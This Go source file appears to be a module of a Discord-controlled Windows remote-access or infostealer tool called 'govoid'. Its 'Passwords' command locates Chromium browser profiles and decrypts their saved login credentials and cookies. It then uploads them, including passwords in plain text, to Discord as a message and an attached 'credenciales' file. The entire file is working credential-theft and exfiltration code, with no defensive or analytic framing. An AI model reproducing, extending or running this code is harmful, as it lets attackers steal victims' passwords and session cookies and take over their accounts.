//go:build windows

package commands

import (
	"bytes"
	"fmt"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/util"
	"github.com/local/govoid/internal/win32"
)

func Passwords(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	profiles := win32.ChromeProfiles()
	if len(profiles) == 0 {
		Finish(s, i, "ℹ️ No se encontró ningún perfil de navegador Chromium con datos.\n```\n"+
			strings.Join(win32.ChromeScan(), "\n")+"\n```")
		return
	}

	cookies, logins, failures := collectBrowserData(profiles)

	if len(cookies) == 0 && len(logins) == 0 {
		detail := "sin filas"
		if len(failures) > 0 {
			detail = strings.Join(failures, "\n")
		}
		Finish(s, i, "ℹ️ Los perfiles existen pero no devolvieron cookies ni credenciales.\n```\n"+
			util.SafeCut(detail, 1500)+"\n```")
		return
	}

	edit, _ := passwordsPayload(cookies, logins, failures, len(profiles))
	if _, err := s.InteractionResponseEdit(i.Interaction, edit); err != nil {
		Finish(s, i, "❌ No se pudo subir el archivo: "+err.Error())
	}
}

func passwordsPayload(cookies []win32.Cookie, logins []win32.Login, failures []string, profileCount int) (*discordgo.WebhookEdit, string) {
	locked := 0
	for _, cookie := range cookies {
		if cookie.Locked {
			locked++
		}
	}
	decrypted := len(cookies) - locked

	body := renderBrowserData(cookies, logins)

	summary := fmt.Sprintf("🍪 **%d cookies** (%d con valor, %d app-bound) · 🔐 **%d credenciales** · %d perfiles",
		len(cookies), decrypted, locked, len(logins), profileCount)

	inline := renderCookieLines(cookies, 60)
	if len(logins) > 0 {
		inline = renderLoginLines(logins, 40) + "\n" + inline
	}
	if inline == "" {
		inline = "sin filas para mostrar"
	}

	file := &discordgo.File{
		Name:        fmt.Sprintf("credenciales_%d.txt", time.Now().Unix()),
		ContentType: "text/plain",
		Reader:      bytes.NewBufferString(body),
	}

	embeds := []*discordgo.MessageEmbed{{
		Title:       "🍪 Cookies y credenciales",
		Description: util.SafeCut(inline, 3900),
		Color:       3447003,
		Timestamp:   nowTimestamp(),
		Footer:      &discordgo.MessageEmbedFooter{Text: summary},
	}}
	if len(failures) > 0 {
		embeds = append(embeds, &discordgo.MessageEmbed{
			Title:       "⚠️ Perfiles con error",
			Description: util.SafeCut(strings.Join(failures, "\n"), 1500),
			Color:       15158332,
		})
	}

	return &discordgo.WebhookEdit{
		Content: &summary,
		Embeds:  &embeds,
		Files:   []*discordgo.File{file},
	}, summary
}

func collectBrowserData(profiles []win32.ChromeProfile) ([]win32.Cookie, []win32.Login, []string) {
	var cookies []win32.Cookie
	var logins []win32.Login
	var failures []string

	for _, profile := range profiles {
		keys, keyErr := win32.ChromeKeysFromLocalState(profile.LocalState)
		if keyErr != nil && keys.User == nil && keys.AppBound == nil {
			failures = append(failures, fmt.Sprintf("%s: claves: %v", profile.Name, keyErr))
			continue
		}

		if profile.Cookies != "" {
			found, err := win32.ReadCookies(profile, keys)
			if err != nil {
				failures = append(failures, fmt.Sprintf("%s: %v", profile.Name, err))
			} else {
				cookies = append(cookies, found...)
			}
		}

		if profile.LoginData != "" {
			found, err := win32.ReadLogins(profile, keys)
			if err != nil {
				failures = append(failures, fmt.Sprintf("%s: %v", profile.Name, err))
			} else {
				logins = append(logins, found...)
			}
		}
	}
	return cookies, logins, failures
}

func renderCookieLines(cookies []win32.Cookie, limit int) string {
	if len(cookies) == 0 {
		return ""
	}
	if limit > len(cookies) {
		limit = len(cookies)
	}

	var builder strings.Builder
	for _, cookie := range cookies[:limit] {
		builder.WriteString(cookieLine(cookie))
		builder.WriteString("\n")
	}
	if len(cookies) > limit {
		builder.WriteString(fmt.Sprintf("… y %d más en el archivo", len(cookies)-limit))
	}
	return strings.TrimRight(builder.String(), "\n")
}

func cookieLine(cookie win32.Cookie) string {
	value := cookie.Value
	switch {
	case cookie.Locked:
		value = "<v20 app-bound>"
	case cookie.Value == "" && cookie.DecryptErr != "":
		value = "<error>"
	}

	line := fmt.Sprintf("`%s` **%s** = %s", util.SafeCut(cookie.URL, 120), cookie.Name, util.SafeCut(value, 120))
	if cookie.Expires.IsZero() {
		line += " · sesión"
	} else {
		line += " · " + cookie.Expires.Format("2006-01-02")
	}
	if cookie.Secure {
		line += " · secure"
	}
	return line
}

func renderLoginLines(logins []win32.Login, limit int) string {
	if len(logins) == 0 {
		return ""
	}
	if limit > len(logins) {
		limit = len(logins)
	}

	var builder strings.Builder
	builder.WriteString("🔐 **Credenciales**\n")
	for _, login := range logins[:limit] {
		password := login.Password
		if login.Error != "" {
			password = "<" + login.Error + ">"
		}
		builder.WriteString(fmt.Sprintf("`%s` **%s** : %s\n",
			util.SafeCut(login.Origin, 120), login.Username, util.SafeCut(password, 120)))
	}
	if len(logins) > limit {
		builder.WriteString(fmt.Sprintf("… y %d más en el archivo\n", len(logins)-limit))
	}
	return strings.TrimRight(builder.String(), "\n")
}

func renderBrowserData(cookies []win32.Cookie, logins []win32.Login) string {
	var builder strings.Builder
	builder.WriteString(config.AppName + " - cookies y credenciales de navegadores Chromium\n")
	builder.WriteString("Generado: " + time.Now().Format("2006-01-02 15:04:05") + "\n")
	builder.WriteString(strings.Repeat("=", 72) + "\n\n")

	builder.WriteString(fmt.Sprintf("== CREDENCIALES (%d) ==\n", len(logins)))
	if len(logins) == 0 {
		builder.WriteString("(ninguna guardada)\n")
	}
	for _, login := range logins {
		builder.WriteString("[" + login.Profile + "] " + login.Origin + "\n")
		builder.WriteString("  usuario : " + login.Username + "\n")
		if login.Error != "" {
			builder.WriteString("  password: <ERROR: " + login.Error + ">\n")
		} else {
			builder.WriteString("  password: " + login.Password + "\n")
		}
		builder.WriteString("\n")
	}

	builder.WriteString(fmt.Sprintf("\n== COOKIES (%d) ==\n", len(cookies)))
	builder.WriteString("url | nombre = valor | path | caduca | flags\n\n")
	for _, cookie := range cookies {
		builder.WriteString("[" + cookie.Profile + "] " + cookie.URL + "\n")
		builder.WriteString("  cookie  : " + cookie.Name + " = " + cookie.Value)
		if cookie.Locked {
			builder.WriteString("  <v20 app-bound, valor cifrado por Chrome>")
		}
		if cookie.DecryptErr != "" {
			builder.WriteString("  <" + cookie.DecryptErr + ">")
		}
		builder.WriteString("\n  path    : " + cookie.Path)
		if cookie.Expires.IsZero() {
			builder.WriteString("\n  caduca  : sesión")
		} else {
			builder.WriteString("\n  caduca  : " + cookie.Expires.Format("2006-01-02 15:04"))
		}
		if cookie.Secure {
			builder.WriteString("  secure")
		}
		if cookie.HTTPOnly {
			builder.WriteString("  httponly")
		}
		builder.WriteString("\n\n")
	}

	return builder.String()
}
